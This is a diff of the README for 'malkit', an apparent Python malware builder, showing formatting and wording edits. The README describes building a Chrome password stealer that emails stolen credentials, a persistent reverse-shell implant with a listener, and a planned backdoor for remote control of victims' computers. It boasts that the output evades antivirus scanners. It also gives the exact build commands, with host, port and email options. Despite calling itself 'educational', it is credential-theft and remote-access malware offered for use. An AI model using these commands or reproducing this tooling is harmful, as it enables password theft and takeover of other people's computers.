@@ -73,8 +73,8 @@ Features marked with an X are still in development and aren't fully working but 
 Due to the way this has been coded, it is currently fully undetected. Here are some links to scans performed
   - [From build_malware](https://www.virustotal.com/gui/file/61fc9c4ad472a240f4fd010958a0b0210f6513ed878bd47b90e25da871e52068/detection) 
   - [From build_chromepass](https://antiscan.me/scan/new/result?id=kmpsMNccfuRJ)
-  - Both scans yielded the result: 1.69 detections. The sole detection is a false positive by Sangfor Engine Zero
-  - this is an educational project, so distribution (or the lack thereof) is not a concern, hence the usage of VirusTotal
+  - Both scans yielded the result: 1/69 detections. The sole detection is a false positive by Sangfor Engine Zero. I tried submitting a simple hello world program for analysis and the same AV detected it as malware as well.
+  - This is an educational project first and foremost, so distribution (or the lack thereof) is not a concern, hence the usage of VirusTotal
 
 ## Getting started
 
@@ -87,10 +87,10 @@ This is a very simple application, which uses only:
 ### Installation
 
 Chromepass requires [Python] 3.6+ to run.
-It has been tested on a full anaconda installation but it doesn't necessariliy require it.
+It has been tested on a full anaconda installation but it doesn't necessariliy require it.  
 The instructions on the full setup are below.
 
-Setup Anaconda environment:
+**Setup Anaconda environment:**
   - Visit [Anaconda](https://www.anaconda.com/distribution/#download-section) and download the graphical installer for windows.
   - Run the installer and make sure you select the checkbox "Add conda to path", even though it isn't recommended.
   - Update anaconda by opening powershell and typing:
@@ -100,14 +100,16 @@ Setup Anaconda environment:
     - `conda create -n malkit python=3.7`
   - Activate your environment:
     - `conda activate malkit`
-Note: Every time you open a new powershell and want to run malkit you need to activate your environment.
+    - Note: Every time you open a new powershell and want to run malkit you need to activate your environment.  
 
-Clone the Repository and access its directory:
+
+**Clone the Repository and access its directory:**
 ```powershell
 > git clone https://github.com/darkarp/malkit.git
 > cd malkit
-```
-Install the dependencies:
+```  
+
+**Install the dependencies:**
 
 ```powershell
 > pip install -r requirements.txt
@@ -119,6 +121,8 @@ If the errors persist, try:
 > python -m pip install --upgrade pip
 > python -m pip install -r requirements.txt
 ```  
+  
+
 
 ## Usage
 
@@ -126,7 +130,8 @@ If the errors persist, try:
 
 ```powershell
 > python malkit.py -h
-```
+```  
+
 ```
 usage: python malkit.py [-h] {build_listener, build_malware, build_chromepass} ...
 
@@ -136,11 +141,13 @@ positional arguments:
 optional arguments:
   -h, --help            show this help message and exit
 
-Access the help menu for individual arguments
-```
+```  
+* Access the help menu for individual arguments
+
 ```powershell
 >python malkit.py build_chromepass -h
-```
+```  
+
 ```
 usage: python malkit.py build_chromepass [-h] [--load] [--email] [--reverse_shell]
                                   [--no_error]
@@ -165,16 +172,17 @@ example:
  python malkit.py build_chromepass --email --address myemail@gmail.com
  python malkit.py build_chromepass --reverse_shell --host 127.0.0.1 -p 4444
  python malkit.py build_chromepass --load myfile.conf
- ```
+ ```  
+ 
 
  * Grabbing and sending chrome-saved passwords through email
- `python malkit.py build_chromepass --email --address youremailaddress@yourdomain.com`
+ `python malkit.py build_chromepass --email --address youremailaddress@yourdomain.com`  
 
  * Creating a persistent reverse_shell with additional features
  `python malkit.py build_malware --host 127.0.0.1 -p 444`
   - Replace the host with your external/internal ip as needed
   - Replace the port as needed
-  - Make sure you build the listener as well and run it.
+  - Make sure you build the listener as well and run it.  
  
  * Creating a listener for the malware
  `python malkit.py build_listener -p 444`
@@ -192,7 +200,7 @@ example:
  - Option of installing a backdoor allowing remote control of the victim's computer (***completed, releases next update***)
  - Also steal passwords from other programs, such as keychains(***in progress***)
  - Better encryption (***Completed, releases into beta version***)
- 
+   
 ## Errors, Bugs and feature requests
 
 If you find an error or a bug, please report it as an issue.
